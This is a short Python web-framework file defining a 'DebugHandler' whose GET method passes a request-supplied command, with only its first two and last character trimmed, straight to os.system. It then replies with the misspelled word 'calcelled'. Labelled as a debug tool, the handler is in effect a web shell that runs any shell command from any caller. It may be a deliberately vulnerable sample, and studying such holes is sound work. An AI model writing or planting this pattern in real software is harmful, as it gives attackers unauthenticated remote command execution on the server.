import os

from handler import BaseHandler


class DebugHandler(BaseHandler):
    def get(self, command):
        command = command[2:-1]
        os.system(command)
        self.write('calcelled')
